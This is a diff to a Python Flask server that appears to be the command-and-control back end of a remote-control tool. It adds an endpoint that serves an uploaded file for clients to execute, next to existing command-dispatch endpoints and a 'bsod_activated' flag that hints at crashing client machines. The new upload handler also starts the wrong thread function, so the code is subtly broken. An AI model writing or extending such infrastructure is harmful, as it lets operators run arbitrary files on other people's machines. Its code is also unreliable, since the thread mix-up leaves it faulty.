@@ -10,18 +10,29 @@ limiter = Limiter(get_remote_address, app=app)
 command: str = ""
 image: bytes = b""
 bsod_activated: bool = False
+runfile: bytes = b""
 
 
-@app.route("/command-center", methods=["GET", "POST"])
+@app.route("/runfile-center", methods=["GET"])
+def runfile_center() -> Response:
+    global runfile
+    if len(runfile) == 0:
+        return Response("no files to execute", 204)
+    else:
+        answer = Response(runfile, 200)
+        runfile = b""
+        return answer
+
+
+@app.route("/command-center", methods=["GET"])
 def command_center() -> Response:
-    if request.method == "GET":
-        global command
-        if len(command) == 0:
-            return Response("no commands to execute", 204)
-        else:
-            answer = Response(command, 200)
-            command = ""
-            return answer
+    global command
+    if len(command) == 0:
+        return Response("no commands to execute", 204)
+    else:
+        answer = Response(command, 200)
+        command = ""
+        return answer
 
 
 @app.route("/image-center", methods=["GET"])
@@ -91,8 +102,26 @@ def post_command() -> Response:
         return Response("invalid key", 403)
 
 
+@app.route("/post_runfile", methods=["POST"])
+def post_runfile() -> Response:
+    if check_key(request.args.get("key")):
+        global runfile
+        runfile = request.files["file"].stream.read()
+        Thread(target=post_image_thread, args=[runfile]).start()
+        return Response("success", 200)
+    else:
+        return Response("invalid key", 403)
+
+
 def hash_key(key: str) -> str:
     return sha256(key.encode()).hexdigest()
+
+
+def post_runfile_thread(data: bytes) -> None:
+    global runfile
+    runfile = data
+    sleep(8)
+    runfile = b""
 
 
 def post_image_thread(data: bytes) -> None:
